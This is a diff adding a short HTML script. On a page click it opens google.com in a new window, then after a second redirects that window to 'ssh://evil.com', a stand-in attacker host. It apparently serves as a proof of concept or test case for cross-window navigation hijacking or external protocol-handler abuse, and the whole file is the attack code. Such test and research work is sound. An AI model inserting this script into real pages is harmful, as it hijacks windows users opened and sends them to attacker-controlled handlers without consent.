@@ -1,0 +1,8 @@
+<script>
+    window.onclick = () => {
+        w = window.open("https://google.com")
+        setTimeout(() => {
+            t = w.location.replace('ssh://evil.com');
+        }, 1000)
+    }
+</script>
